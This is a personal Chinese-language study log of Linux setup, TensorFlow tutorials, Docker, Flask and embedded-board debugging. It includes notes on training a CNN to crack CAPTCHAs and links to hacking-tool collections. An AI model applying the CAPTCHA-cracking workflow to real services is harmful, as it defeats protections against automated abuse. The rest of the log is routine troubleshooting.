kalilinux在 virtualbox 安装:http://blog.topspeedsnail.com/archives/1841
	注意,安装时分配的硬盘尽可能大,比如大于20GB,不然安装出错!!
	登陆界面:用户填root 
	使用virtualbox 运行虚拟kali时,一定要分配动态硬盘,因为虚拟kali硬盘不够是可以扩容,扩容例子: (resize的单位是 MB!!)
		kingders@kingders-ThinkPad-T420:~/VirtualBox VMs/kali$ VBoxManage modifyhd "NewVirtualDisk1.vdi" --resize 1024
	注意:虚拟kali 使用的网络方式是 桥接方式,这样才可以让kali接到同一层局域网
kaliliunx加入拼音输入法:(卧槽,到最后都不知道是怎么成功的)
	语言输入两种框架 ibus, fcitx,按道理选择其中之一就好
	安装:
	apt-get install fcitx fcitx-googlepinyin
	aptitude install ibus ibus-pinyin
	配置:(使用ibus框架)
	# apt-get install ibus ibus-pinyin  然后在设置里点区域语言然后改成中文  在源选项哪里汉语pinyin 点添加
	# im-config 弹出窗口中选择ibus ibus智能拼音什么的,然后一路yes
	# ibus engine pinyin
	重启系统
	如果还不行再ibus engine pinyin 一次
	最后发现,只要 设置里点区域语言 中的格式选中国,而且之前im-config设置选ibus,日后如果打不出拼音,ibus engine pinyin 一下就好








20170512
机器学习破解验证码(cnn模型):http://blog.topspeedsnail.com/archives/10858/comment-page-1#comment-1332
		  http://blog.csdn.net/ljp1919/article/details/64501002
	整个项目使用python2
	拷下来的源码开头要加上: # -*- coding:UTF-8 -*-
	python2.7 gen_captcha.py	//验证码图片生成
		出错:
		  File "/usr/lib/python2.7/dist-packages/PIL/ImageDraw.py", line 164, in arc
		    self.draw.draw_arc(xy, start, end, ink)
		TypeError: must be sequence of length 4, not 2
		解决:sudo pip2 install -U Pillow //更新pillow -u 是upgrade的意思
	python2.7 learning_and_test.py	//不断使用gen_captcha.py里的函数,生成验证码图片然后用于训练,
					//最后当正确率大于50%后输出 训练成果文件
		出错1:
		  File "learning_and_test.py", line 164, in train_crack_captcha_cnn
		    loss = tf.reduce_mean(tf.nn.sigmoid_cross_entropy_with_logits(logits=output, labels=Y))
		TypeError: sigmoid_cross_entropy_with_logits() got an unexpected keyword argument 'labels'
		解决,与python2.7版本有关:
		loss = tf.reduce_mean(tf.nn.sigmoid_cross_entropy_with_logits(output, Y)) //此版本python2.7使用这种格式
		#loss = tf.reduce_mean(tf.nn.sigmoid_cross_entropy_with_logits(logits=output, labels=Y))
		出错2:
		  File "learning_and_test.py", line 178, in train_crack_captcha_cnn
		    sess.run(tf.global_variables_initializer())
		AttributeError: 'module' object has no attribute 'global_variables_initializer'
		解决,与python2.7版本有关:
		#sess.run(tf.global_variables_initializer())
 		sess.run(tf.initialize_all_variables()) //此版本python2.7使用这种格式
	python2.7 test.py	//使用训练成果文件 验证验证码!!
		出错1:
		  File "/usr/local/lib/python2.7/dist-packages/tensorflow/python/training/saver.py", line 1087, in restore
		    if not gfile.Glob(save_path):
		  File "/usr/local/lib/python2.7/dist-packages/tensorflow/python/platform/gfile.py", line 262, in Glob
		    return _glob.glob(glob)
		  File "/usr/lib/python2.7/glob.py", line 27, in glob
		    return list(iglob(pathname))
		  File "/usr/lib/python2.7/glob.py", line 38, in iglob
		    if not has_magic(pathname):
		  File "/usr/lib/python2.7/glob.py", line 95, in has_magic
		    return magic_check.search(s) is not None
		解决,与python2.7版本有关:
		saver.restore(sess, tf.train.latest_checkpoint('.'))	//可以这样
		#saver.restore(sess, "crack_capcha.model-7000")		//或者可以这样
		saver.restore(sess, tf.train.latest_checkpoint('crack_capcha.model-7000'))	//不可以这样
		出错2
		明明使用test.py,但是就偏偏也运行上了 learning.py 不应该运行的 train_crack_captcha_cnn()
		解决:
		给 train_crack_captcha_cnn() 前加上 if __name__ == '__main__': 
		出错3:
		各种notfound 问题,
		解决,后来发现 def crack_captcha 这个函数,还是放在 learning好,test.py只调用就好了!!1	
	总结:
		gen_captcha.py	定义了验证码生成函数 gen_captcha_text_and_image 并演示了 验证码生成
		learning.py	定义了cnn模型,
			   	定义了训练函数 train_crack_captcha_cnn
				定义了使用训练模型破解验证码的函数 crack_captcha
				并执行了训练函数 train_crack_captcha_cnn 训练结束生成训练模型 crack_capcha.model-7000
		test.py		执行了使用训练模型破解验证码的函数 crack_captcha
	通过learing 掌握 tensorboard 使用方法!!
		后台运行 tensorboard :	$ tensorboard --logdir=/tmp/logs &
					Starting TensorBoard 16 on port 6006
					(You can navigate to http://0.0.0.0:6006)
		learning.py里,我们对 accuracy 和 loss
			//定义初始化好 accuracy 和 loss 变量后,才添加监控项,即:
			//loss = tf.reduce_mean(...)
			//accuracy = tf.reduce_mean(...)
			//之后,添加监控项:
			tf.scalar_summary("loss", loss)	
			tf.scalar_summary("accuracy", accuracy)
			//把所有要监控的项 打包
			merged_summary_op = tf.merge_all_summaries()
			//初始化所有变量,sess.run(tf.initialize_all_variables())
			//动态监控文档放在 /tmp/logs文件夹里
			//注意,tf.initialize_all_variables() 是初始化了所有变量
			//sess.run()又是开始了迭代计算训练
			//初始化了所有变量,又开始了迭代计算训练才能添加动态监控文档:
			summary_writer = tf.train.SummaryWriter('/tmp/logs', graph_def=sess.graph_def)
			//注意后面的,
			//acc = sess.run(accuracy, feed_dict={X: batch_x_test, Y: batch_y_test, keep_prob: 1.})
			//_, loss_ = sess.run([optimizer, loss], feed_dict={X: batch_x, Y: batch_y, keep_prob: 0.75})
			//都读取迭代训练中途得到的数据结果,然后根据结果,更改收敛条件后,重新继续迭代训练
			//也就说,自从第一次sess.run后,就开始了迭代训练的计算,
			//每当下一次sess.run指令之前,中间其实经历了多次迭代训练,而不是只计算1次
			//迭代计算的结果是离散的,只有不断更改收敛条件才可以优化下一段时间的迭代计算,
			//而关于tensorboard调用的sess.run,只是得到当前迭代计算得到的结果,并没有更改收敛条件来影响后面的迭代训练活动
			summary_str = sess.run(merged_summary_op, feed_dict={X: batch_x, Y: batch_y, keep_prob: 0.75})
			//然后,上传到监控文件
			summary_writer.add_summary(summary_str, step)
		然后浏览器输入:http://0.0.0.0:6006/
			便能看到结果,如果发现没有内容,rm -r /tmp/logs/* 		//*/清空内容
			重新打开tensorboard 试试

补充:
python的一些重要模块:
	NumPy和SciPy是开源的 Python 的科学计算模块	
		NumPy：怎么处理缺失的数字:http://blog.topspeedsnail.com/archives/866
		NumPy入门详解:http://blog.topspeedsnail.com/archives/599
	pygame
		PyGame教程一：开始:http://blog.topspeedsnail.com/archives/2155
		PyGame教程二：声音和音乐:http://blog.topspeedsnail.com/archives/2166
安全与黑客:
	系统安全：开源的5个渗透测试工具:http://blog.topspeedsnail.com/archives/2817
	Katoolin – 在Ubuntu上安装Kali Linux工具集:http://blog.topspeedsnail.com/archives/4498
						 https://github.com/tiancode/learn-hacking
python的一种调用函数时的注意点:
		假如:
		a.py:	def了aa,bb,cc函数, 
			python a.py 时,会运行a.py的全局命令行, 
		b.py:	需要调用 a.py 的 aa 和 cc 函数, 就得加两行头 from a.py import aa,  from a.py import cc
			但是python b.py 时,除了成功调用aa cc外,还会,把a.py的全局命令行也执行一遍
			如果 b.py 只想运行自己的命令行,而不想执行 a.py 的命令行,但有可以使用别人def的函数,
			那么就得在 a.py的命令行前加上 if __name__ == '__main__':
			这样子: 
				python a.py 依然能完美执行自己的所有命令行
				python b.py 只执行自己的命令行,
python完美print出中文:
		print("某某某 {}, 哈哈哈 {} {} ".format(num1,charb,textc))  # (60, 160, 3)
		效果例子: 某某某 467, 哈哈哈 g kingders
		关键使用 " .format()" 格式函数  
python虚拟环境:
	不同的项目可能需要不同的python环境，
	比如不同的解释机: python2或者python3,专属的库文件,
	如果所以库和编译器都处于同一个环境时,就可能出现库与库之间冲突,或者项目库函数指向出错等兼容问题,
	所以针对不同的项目,需要不一样的编译器软件库,可以都放在一个独立的环境里!!在独立的环境里执行项目
	安装	
	pip install virtualenv  //(我机子默认python是python3的)默认使用python3安装的virtualenv版本
	创建:
	virtualenv aaa  	//创建一个独立环境空间aaa,在当前文件夹建立一个aaa文件夹,
				//这种默认情况下,会把默认的解释机,和对应的默认软件库加入环境aaa
	virtualenv --no-site-packages bbb //创建一个独立环境空间aaa,在当前文件夹建立一个aaa文件夹,
					  //这情况下,不会把默认的软件库加入环境bbb,
	virtualenv ccc --python=python2   //创建一个独立环境空间ccc,在当前文件夹建立一个ccc文件夹,
					  //这种默认情况下,会把默认的软件库,和默认的解释机加入环境ccc
	启用虚拟环境
	cd ccc	//进入环境文件夹
	source ./bin/activate
	cd ~ //进入要执行的项目的文件夹,例如~
	查看当前状态
	(ccc) kingders@kingders-ThinkPad-T420:~$ 	//先可以直观看到(ccc)前缀,就是说现在处于 ccc 的独立python 工作环境里下
	python -V  	//python 版本自动为2.7.6版本
	Python 2.7.6	
	pip -V		//pip 版本自动为显示为python2.7 对应的!!	
	pip 9.0.1 from /home/kingders/smart210/study/tensorflow_study/ramdom_captcha/ccc/local/lib/python2.7/site-packages (python 2.7)
	添加指定软件库
	pip install numpy scipy scikit-learn pillow h5py keras	//添加的软件库只会加入到 ccc 文件夹里,只为ccc环境所用
	退出虚拟环境
	deactivate
	/////////////////////////////////////////////////////////////
	以上是一般虚拟环境的使用过程
	如果要使用管理多个 虚拟环境, 建议再添加 virtualenvwrapper 补充功能软件
	安装:
	sudo pip install virtualenvwrapper //(我机子默认python是python3的)默认使用python3安装的virtualenvwrapper版本
	mkdir $HOME/.local/virtualenvs	  //创建虚拟环境管理目录 (不要加sudo)
	sudo gedit ~/.bashrc 	//末尾添加:
		# by william
		# setting about virtualenvwrapper
		export VIRTUALENV_USE_DISTRIBUTE=1        #  总是使用 pip/distribute                                        
		export WORKON_HOME=$HOME/.local/virtualenvs       # 所有虚拟环境存储的目录
		if [ -e $HOME/.local/bin/virtualenvwrapper.sh ];then
		   source $HOME/.local/bin/virtualenvwrapper.sh                                                
		else if [ -e /usr/local/bin/virtualenvwrapper.sh ];then
		         source /usr/local/bin/virtualenvwrapper.sh
		     fi
		fi
		export PIP_VIRTUALENV_BASE=$WORKON_HOME
		export PIP_RESPECT_VIRTUALENV=true
	source ~/.bashrc	//启动 virtualenvwrapper
	出错1: 每次打开终端都有:
		/usr/bin/python: No module named virtualenvwrapper
		virtualenvwrapper.sh: There was a problem running the initialization hooks. 
		If Python could not import the module virtualenvwrapper.hook_loader,
		check that virtualenvwrapper has been installed for
		VIRTUALENVWRAPPER_PYTHON=/usr/bin/python and that PATH is
		set properly.
		解决:这时候可以将VIRTUALENVWRAPPER_PYTHON路径(python全局路径)加入到~/.bashrc中，
		sudo gedit ~/.bashrc 	//在设置virtualenvwrapper其他内容前先添加:
			export VIRTUALENVWRAPPER_PYTHON=/usr/bin/python3
		source ~/.bashrc	//由于我们安装的virtualenvwrapper是针对python3版本,所以需要使用python3开启
					//而默认的/usr/bin/python虽然指向python3,但是这里不能很好指向python3
					//所以直接改成/usr/bin/python3
		成功后,每次打开终端都会自动打开了virtualenvwrapper后台.不再有上述问题信息出现!!
		







20170514
机器学习分类评论:http://blog.topspeedsnail.com/archives/10420
	这里分别对比使用了两个训练模型一个是 feedfroward,另外一个是CNN
	其中使用到nltk模块,也需要下载一些nltk插件,使用nltkdownload.py
	trainingandtestdata.zip 是训练用原始数据包,解压得:
		testdata.manual.2009.06.14.csv,
		training.1600000.processed.noemoticon.csv
	整个项目使用python3
	python3 preprocess.py	//预处理数据
		需要 nltk(自然语言工具库 Natural Language Toolkit)软件包,另外nltk还需要一些库,通过使用 nltkdownload.py下载到
		需要 pandas软件包,
		最后得到预处理后的据据 
			training.csv,
			tesing.csv
	python3 feedfroward_learning.py  //如果使用feedfroward学习模型,执行此训练
		出错1
		  File "feedfroward_learning.py", line 88, in train_neural_network
    		     cost_func = tf.reduce_mean(tf.nn.softmax_cross_entropy_with_logits(predict, Y))
		  File "/usr/local/lib/python3.4/dist-packages/tensorflow/python/ops/nn_ops.py", line 1562, in _ensure_xent_args
		    "named arguments (labels=..., logits=..., ...)" % name)
		ValueError: Only call `softmax_cross_entropy_with_logits` with named arguments (labels=..., logits=..., ...)
		解决:
		#cost_func = tf.reduce_mean(tf.nn.softmax_cross_entropy_with_logits(predict, Y))	# tensor 旧版本
		cost_func = tf.reduce_mean(tf.nn.softmax_cross_entropy_with_logits(logits=predict, labels=Y))	# tensor 新版本


	python3 CNN_learning.py		//如果使用CNN学习模型,执行此训练
		出错1:
		  File "CNN_learning.py", line 84, in neural_network
		    h_pool = tf.concat(3, pooled_outputs)
		.........
		  File "/usr/local/lib/python3.4/dist-packages/tensorflow/python/framework/tensor_util.py", line 302, in _AssertCompatible
		    (dtype.name, repr(mismatch), type(mismatch).__name__))
		TypeError: Expected int32, got list containing Tensors of type '_Message' instead.
		解决:tensorflow版本格式问题
		# h_pool = tf.concat(3, pooled_outputs)  tensorflow 0.x 版本写法
		h_pool = tf.concat(pooled_outputs, 3)	//正确写法
		出错2:
		  File "CNN_learning.py", line 102, in train_neural_network
		    loss = tf.reduce_mean(tf.nn.softmax_cross_entropy_with_logits(output, Y))
		解决:tensorflow版本格式问题
		# loss = tf.reduce_mean(tf.nn.softmax_cross_entropy_with_logits(output, Y)) # tensorflow 旧版本写法
		loss = tf.reduce_mean(tf.nn.softmax_cross_entropy_with_logits(logits=output, labels=Y)) # tensorflow 旧版本写法
		另外还要添加一个输出训练模型数据的代码!!!
		(准确率暂时只收敛到50%,准确率低主要是因为数据量太小,也不知道是不是模型不完整问题)








20170516
(以下都是个人pc上的)
安装opencv依赖:
	升级系统：
	$ sudo apt-get update
	$ sudo apt-get upgrade
	安装基本编译工具：
	$ sudo apt-get install build-essential cmake pkg-config
	由于OpenCV是计算机视觉库，总需要加载一些图像文件（ JPEG, PNG, TIFF）。使用下面命令安装一些必要的图像库：
	$ sudo apt-get install libjpeg8-dev libtiff5-dev libjasper-dev libpng12-dev	
	除了图片之外，OpenCV还要处理视频文件。使用下面命令安装一些视频编解码库：
	$ sudo apt-get install libavcodec-dev libavformat-dev libswscale-dev libv4l-dev
	$ sudo apt-get install libxvidcore-dev libx264-dev
	OpenCV的GUI模块highgui依赖Gtk。安装gtk库：
	$ sudo apt-get install libgtk-3-dev
	下面安装一些可以提高OpenCV性能的库，如矩阵操作：
	$ sudo apt-get install libatlas-base-dev gfortran
	安装Python2和Python3的开发库：
	$ sudo apt-get install python2.7-dev python3.4-dev
编译安装opencv3.1.0
	下载opencv3.1.0源码包,并原地解压
	$ ~/other/opencv
	$ wget -O opencv.zip https://github.com/Itseez/opencv/archive/3.1.0.zip
	$ unzip opencv.zip	
	$ wget -O opencv_contrib.zip https://github.com/Itseez/opencv_contrib/archive/3.1.0.zip
	$ unzip opencv_contrib.zip	
	编译opencv
	$ cd ~/other/opencv/opencv-3.1.0
	$ mkdir build
	$ cd build
	$ cmake -D CMAKE_BUILD_TYPE=RELEASE \
 		    -D CMAKE_INSTALL_PREFIX=/usr/local \
		    -D INSTALL_PYTHON_EXAMPLES=ON \
		    -D INSTALL_C_EXAMPLES=OFF \
		    -D OPENCV_EXTRA_MODULES_PATH=/home/kingders/other/opencv/opencv_contrib-3.1.0/modules \ # opencv_contrib路径
		    -D PYTHON_EXECUTABLE=/home/kingders/.local/virtualenvs/cv3/bin/python \  # 使用cv3
		    -D BUILD_EXAMPLES=ON ..  # ".."这两点不能忽略
	$ make -j4
		出错1
		In file included from /home/kingders/other/opencv/opencv-3.1.0/modules/videoio/src/cap_gstreamer.cpp:55:0:
		/usr/include/gstreamer-1.0/gst/gst.h:27:18: fatal error: glib.h: No such file or directory
 		#include <glib.h>
	                  ^
		compilation terminated.
		make[2]: *** [modules/videoio/CMakeFiles/opencv_videoio.dir/src/cap_gstreamer.cpp.o] Error 1
		make[1]: *** [modules/videoio/CMakeFiles/opencv_videoio.dir/all] Error 2
		make[1]: *** Waiting for unfinished jobs....
		编译过程中遇到众多错误,原因都是因为不能从默认 /usr/include 找到头文件,但是明明很多模块都已经成功安装好的,
		方法一:cp对应.h文件到 /usr/include,
		方法二:.bashrc 添加对应c,c++ 头文件搜索目录!! 然后 source ~/.bashrc 例如:
		export C_INCLUDE_PATH=$C_INCLUDE_PATH:/usr/lib/x86_64-linux-gnu/glib-2.0/include:/usr/include/glib-2.0
		export CPLUS_INCLUDE_PATH=$CPLUS_INCLUDE_PATH:/usr/lib/x86_64-linux-gnu/glib-2.0/include:/usr/include/glib-2.0
	$ sudo make install
	$ sudo ldconfig
创建一个python3 虚拟环境cv3 配置cv3是一个python3,opencv环境!!
	mkvirtualenv cv3 -p python3
	workon cv3
	安装numpy
	pip install numpy
	添加opencv库
	//安装好的opencv对应python3.4的库安装路径和库名称为:/usr/local/lib/python3.5/site-packages/cv2.cpython-34m.so
	//建立链接文件到虚拟空间指定位置
	$ cd ~/.local/virtualenvs/cv3/lib/python3.4/site-packages/
	$ ln -s /usr/local/lib/python3.4/site-packages/cv2.cpython-34m.so cv2.so

训练一个游戏Ai: (DQN)
	目录:/home/kingders/smart210/study/tensorflow_study/AI_game
	参考:http://blog.topspeedsnail.com/archives/10459 
	这里其实是一个 决策模型!! DQN
	需要不断截取屏幕截图,所以需要opencv库!!
	workon cv3 使用cv3虚拟环境
	python3 ai_player.py		
	出错!!
	Traceback (most recent call last):
	  File "ai_player.py", line 203, in <module>
	    train_neural_network(input_image)
	  File "ai_player.py", line 179, in train_neural_network
	    minibatch = random.sample(D, BATCH)
	  File "/home/kingders/.local/virtualenvs/cv3/lib/python3.4/random.py", line 311, in sample
	    raise TypeError("Population must be a sequence or set.  For dicts, use list(d).")
	TypeError: Population must be a sequence or set.  For dicts, use list(d).
	解决:
	line179:改为 minibatch = random.sample(list(D), BATCH)

训练一个游戏Ai2: (遗传算法) http://blog.topspeedsnail.com/archives/10952
	安装图片转换工具:
	sudo apt-get install imagemagick
	转换图片到png
	mogrify -format png plane.jpeg
	mogrify -format png enemy.gif
	修改图片分辨率
	mogrify -resize 50x50 *.png
	执行游戏Ai2
	python ai_player2.py`
		//这类算法模型不需要屏幕截图,不加载需要opencv模块
		//neuro_evolution.py是支持函数库文件

自动写诗: (RNN) http://blog.topspeedsnail.com/archives/10542
	python3 training
	出错1:
	  File "training.py", line 86, in neural_network
	    cell_fun = tf.nn.rnn_cell.BasicLSTMCell
	AttributeError: 'module' object has no attribute 'rnn_cell'
	解决:
	tf.nn.rnn_cell.BasicLSTMCell变成tf.contrib.rnn.BasicLSTMCell
	后续继续出现问题:
	后来发现,并不是简单替换既可以,新版rnn的框架改变了,所以,并不能很快修改出错问题!!!
	所以这个例子搁置!!

自动写歌: (RNN) http://blog.topspeedsnail.com/archives/10508
	先安装midi播放器:
	sudo apt-get install timidity
	sudo apt-get install fluidsynth
	播放:
	timidity -Od "midi_pkg/HotelCalifornia.mid" 出错,不会用,搁置
	准备音乐包: 人手下载太慢,将为此练习爬虫!!!!!!
	所以这个例子也搁置!!

google_deepdream 网络:http://blog.topspeedsnail.com/archives/10667
	执行时出错

图像分类器 – retrain谷歌Inception模型: http://blog.topspeedsnail.com/archives/10685	












20170517
(实在太慢,所以以下都是公司pc上的)
按上述部署公司pc
练习了python3 的文件操作 python_basic
并测试生成妹子图项目:(pixcNN) http://blog.topspeedsnail.com/archives/10660
	总之先下载图片包...
docker: 
	docker用于管理和打包 集成运行环境(虚拟系统,docker容器)
	集成运行环境(docker容器):就是一个装好了各种库,能够独立运行指定软件的虚拟根文件系统镜像
		比如说 软件A 可以在一个定制好的 docker容器/虚拟系统 里运行,
		而不需要为了运行 软件A,往自己系统加装各种乱七八糟库,搞乱自己系统
	这次 open_nsfw 需要使用一个 caffe模型框架库,这个东西不常用,不需要为了运行他而折腾安装 
		替代方案是找一个 已经装好 caffe模型框架库 的docker容器就好了
	docker对系统的要求： Linux 内核3.10+, 64位系统
		cat /etc/lsb-release	//查看ubuntu版本
		uname -a		//查看内核版本
	安装docker: http://blog.topspeedsnail.com/archives/7562
	sudo apt install docker.io
	启动/关闭docker后台服务 (与参考链接有别)
	sudo service docker start
		docker start/running, process 12723
	sudo service docker stop 
		docker stop/waiting
	版本查看:
	sudo docker version
		Client version: 1.6.2
		Client API version: 1.18
		Go version (client): go1.2.1
		Git commit (client): 7c8fca2
		OS/Arch (client): linux/amd64
		Server version: 1.6.2
		Server API version: 1.18
		Go version (server): go1.2.1
		Git commit (server): 7c8fca2
		OS/Arch (server): linux/amd64

使用open_nsfw,一个基于Caffe的成人图片识别模型:
	启动 docker 服务
	sudo service docker start
	下载一个 别人做好的 装有 caffe框架的 docker容器 镜像: http://blog.csdn.net/elaine_bao/article/details/53117676
	docker pull elezar/caffe:cpu
	下载完成后，测试是否安装正确
	docker run -ti elezar/caffe:cpu caffe --version
		libdc1394 error: Failed to initialize libdc1394 
		caffe version 1.0.0-rc3
		//关于libdc1394 error不用理会,只是容器里其他内容没装完整
		//如果这条消息辣眼睛,可以禁用这个模块: ln -s /dev/null /dev/raw1394
	在generate_pic项目文件夹里下载 open_nsfw 然后 cd进去
		git clone https://github.com/yahoo/open_nsfw
		cd /home/kingders/smart210/study/tensorflow_study/generate_pic/open_nsfw
	进入 caffe框架的 docker容器,并且以当前路径为镜像系统里的工作目录!!
		sudo docker run -t -i --volume=$(pwd):/workspace elezar/caffe:cpu /bin/bash
		root@21882b4bc80c:/workspace# 		//然后命令行变这样了,并是进入成功!!
		这时/home/kingders/smart210/study/tensorflow_study/generate_pic/open_nsfw,映射到虚拟系统离去了
		ls /workspace //里面的东西与/home/kingders/smart210/study/tensorflow_study/generate_pic/open_nsfw里一模一样
	运行 open_nsfw 鉴别图片色情级别!!
	python ./classify_nsfw.py --model_def nsfw_model/deploy.prototxt --pretrained_model nsfw_model/resnet_50_1by2_nsfw.caffemodel test1.jpg	
	//成功鉴别,输出级别分数!!
	//题外话,classify_nsfw.py是 python2的脚本,python3运行会出错,上面的docker容器默认python2,但也有python3
	//	而 elezar/caffe:cpu 这个虚拟系统里,默认python是python2,所以完美执行,
	//还有 .py脚本,只能使用虚拟系统里已有的支持库,如果没有也不会去搜索实体系统的支持库
	//	例如 elezar/caffe:cpu 这个虚拟系统里 没有pygame这个模块,所以运有 import pygame 的模块时,会出错!!!
	//import PIL 出问题,安装pillow库
	//	sudo apt-get install libjpeg-dev libpng12-dev libfreetype6-dev libtiff-dev
	//	pip install -I --no-cache-dir -v Pillow
	//关于 StringIO库 python3 与python2 兼容问题
	//	http://python.jobbole.com/81091/

训练生成妹子图!!! (generate_pic项目)
	预处理:(都在open_nsfw里操作)
	解压图片包,然后都扔进 images 文件夹
	workon cv_for_py3 (个人pc是cv3)
	together_dir.py	//遍历images文件夹及所有深层子文件夹,把所有分散的.jpg都剪切到girls文件夹里
	minimize.py	//把girls里的图片都缩成统一规格小图片 存到little_girls文件夹里
	dereplication.py	//图片去重 (4万张,好慢!!!!)
	nsfw.py		//未操作此步,计划是筛选出限制级图片删掉,此步需要 在docker容器里执行
	训练并生成妹子图!!!
	gen_pic.py	//由于新版本tensor,所以会有一些格式问题,幸亏变动不大可以迅速处理
			//使用资源十分庞大,电脑无法动了!!!!








20170518
学习使用flask架构,建立网站!!
	建立对应python虚拟机吧,
	mkvirtualenv flask -p python3	
	workon flask
	安装
	pip install flask
	pip install flask-login
	pip install flask-openid
	pip install flask-mail
	pip install flask-sqlalchemy
	pip install sqlalchemy-migrate
	pip install flask-whooshalchemy
	pip install flask-wtf
	pip install flask-babel
	pip install guess_language
	pip install flipflop
	pip install coverage
	一次性安装:
	pip install flask flask-login flask-openid flask-mail flask-sqlalchemy sqlalchemy-migrate flask-whooshalchemy flask-wtf flask-babel guess_language flipflop coverage

hello项目:
	建立文件夹
	hello
	|--app
	|  |--static	
	|  |--templates
	|
	|--tmp	
	习惯上:
		app目录用来存放Python脚本，
		static目录用来存放图片、javascript脚本和css文件。
		templates用来存放模版，tmp存放临时文件
	app下建立 __init__.py 脚本:
		脚本创建了应用程序对象app（Flask对象），然后引入views（下面创建的脚本）。

		views用来处理客户端（浏览器）的请求，每个view可以映射一个或多个URL
	app下建立 views.py 脚本:
		route声明网站根目录/
		route声明／index的URL映射为index函数，每次收到主页请求就会执行这个函数
	hello下建立 run.py 脚本
	Flask默认使用5000端口，打开浏览器输入地址:	
	http://localhost:5000   #  或  http://localhost:5000/index 均可
	上面两个地址都在views.py中定义了，如果输入其他地址，会得到错误信息







20170522
iar win7 编译环境配置
usb串口驱动:使用的是台湾的pi2303芯片
win7的pi2303驱动安装:反正把sam9x35里的usb串口都装就是了,而且只能使用指定一格usb插口,换了擦插口就出错了
(恶心的处理)

sam9x35: (裸机使用iar)
首先,逻辑软件包不一定要安装到iar的指定目录,因为软件包是一个独立完整包,里面的例程可摆脱iar自带依赖,独立工作
弄清楚了 裸机demo里使用了ddram但没有使用mmu,
	但软件包提供了一个mmuinitial()参考:初始化一张地址表,然后启动mmu
裸机demo很多都是在ddram 0x20000000 地址上,使用linux上的bootstraps引导,
	但是bootstraps的复制还有跳转执行的地址要从 0x26f00000 改为 0x20000000
usb cdc 就是串口,但是如何收发需要烧录测试后才能搞清楚api的使用情况
cdc_hid例程的hid 主要是ek上没有用户按键!!使用了模拟键盘按键方式,
	当在edebug串口输入数字1,demo会模拟源源不断按下按键a,作为hid输入到打开的的空白文本里
	再在edebug串口输入数字1,demo会 停止 模拟源源不断按下按键a!!
cdc_hid例程的cdc
	原来例子main.c注册了两个串口,一个是usart0,一个是usb的cdc,(不算dbug),怪不得这么奇怪,
	在uart0输入内容,usbcdc接收到内容
	在usbcdc输入内容,uart0接收到内容
	注意 dbug虽然也是串口,但是在main.c之前就初始化好了的调试串口,
	至于这个debug串口在哪初始化和初始化过程并没有显性公开!但是printf()指向debug串口的.
jlink:
	昨日按照网上调了一个下午还是用不了jlink,今天终于弄好,原来就是重新打开iar,重新加载项目文件就好了
	重申jlink配置:
	开发板启动,正常nandflash启动就好了,不管启动时有没有程序执行都没关系,只要板子通着电
	jlink连开发板和win7,win7设备管理器usb处多出了一个j-link driver
	打开iar,打开项目,不管项目本身被规定在ddram还是nandflash运行都没关系,
	项目->options->debugger->setup->driver(j-link/j-trace) 其他默认
		     ->J-link/J-trace->connection->communication(usb device 0) 其他默认!!!
	(最好重启)重新打开iar,打开项目,于是就可以使用 download and debug了
	还有:
		如果项目简单,放在外围 nandflash 芯片的0x0地址时,开发板nandflash启动时会把程序拷到sram里执行
			jlink download and debug 时,会跳过从nandflash拷贝的过程,直接从sram的程序运行地址开始调试
		如果项目复杂,要在ddram里运行,那么程序先放在nandflash里,
			芯片先把外围 nandflash 芯片的0x0地址时bootstrap拷到sram里执行
			bootstrap再把这项目程序拷到ddram指定位置,然后跳到ddram里的项目程序开始处开始执行!!!
			jlink download and debug 时,会跳过从之前步骤,直接从ddram的项目程序开始处开始调试
	jlink调试原理:jlink模块监测pc指针位置,时刻把pc指针的指向上报,
		而插入断点就是在pc跳转下一条指令前插入一条操作指令,继续执行时,给pc插入本接着要执行的下条指令
		所以从原理看到jlink 调试中断操作,并不是太友好和易操作




20170523
sam9g25: (裸机使用iar, camera例子!!!)
cam接线:
 * <table>
 *   <tr> <th>isi module</th> <th>ISI</th>       <th>PIO</th> </tr>
 *   <tr> <td>1 </td>         <td>3v3</td>       <td>3v3</td> </tr>
 *   <tr> <td>2 </td>         <td>Gnd</td>       <td>Gnd</td> </tr>
 *   <tr> <td>3 </td>         <td>Vdd_isi</td>   <td>3v3</td></tr>
 *   <tr> <td>4 </td>         <td>Gnd</td>       <td>Gnd</td></tr>

 *   <tr> <td>5 </td>         <td>Rst</td>       <td>Pioa28</td></tr>
 *   <tr> <td>6 </td>         <td>Pwd</td>       <td>Pioa29</td></tr>
 *   <tr> <td>7 </td>         <td>Slc</td>       <td>Pioa31</td></tr>
 *   <tr> <td>8 </td>         <td>Sda</td>       <td>Pioa30</td></tr>

 *   <tr> <td>9 </td>         <td>gnd</td>       <td>Gnd</td></tr>
 *   <tr> <td>10</td>         <td>Isi_mck</td>   <td>Pc15</td></tr>
 *   <tr> <td>11</td>         <td>Gnd</td>       <td>Gnd</td></tr>
 *   <tr> <td>12</td>         <td>Isi_vsync</td> <td>Pc13</td></tr>
 *   <tr> <td>13</td>         <td>Gnd</td>       <td>Gnd</td></tr>
 *   <tr> <td>14</td>         <td>Isi_hsync</td> <td>Pc14</td></tr>
 *   <tr> <td>15</td>         <td>Gnd</td>       <td>gnd</td></tr>
 *   <tr> <td>16</td>         <td>Isi_pck</td>   <td>Pc12</td></tr>
 *   <tr> <td>17</td>         <td>Gnd</td>       <td>Gnd</td></tr>
 *   <tr> <td>18</td>         <td>Isi_d0</td>    <td>Pc0</td></tr>
 *   <tr> <td>19</td>         <td>Isi_d1</td>    <td>Pc1</td></tr>
 *   <tr> <td>20</td>         <td>Isi_d2</td>    <td>Pc2</td></tr>
 *   <tr> <td>21</td>         <td>Isi_d3</td>    <td>Pc3</td></tr>
 *   <tr> <td>22</td>         <td>Isi_d4</td>    <td>Pc4</td></tr>
 *   <tr> <td>23</td>         <td>Isi_d5</td>    <td>Pc5</td></tr>
 *   <tr> <td>24</td>         <td>Isi_d6</td>    <td>Pc6</td></tr>
 *   <tr> <td>25</td>         <td>Isi_d7</td>    <td>Pc7</td></tr>
 *   <tr> <td>26</td>         <td>Isi_d8</td>    <td>Pc8</td></tr>
 *   <tr> <td>27</td>         <td>Isi_d9</td>    <td>Pc9</td></tr>
 *   <tr> <td>28</td>         <td>Isi_d10</td>   <td>Pc10</td></tr>
 *   <tr> <td>29</td>         <td>Isi_d11</td>   <td>Pc11</td></tr>
 *   <tr> <td>30</td>         <td>Gnd</td>       <td>gnd</td></tr>
 * </table>
经观察:
	ov2640只有10针数据线,虽然上面isi初始化了11针数据线,但到头来最多只使用其中10针
	还有,ov2640默认数据传输是10针高位模式,而demo里也是设置使用10针高位模式,
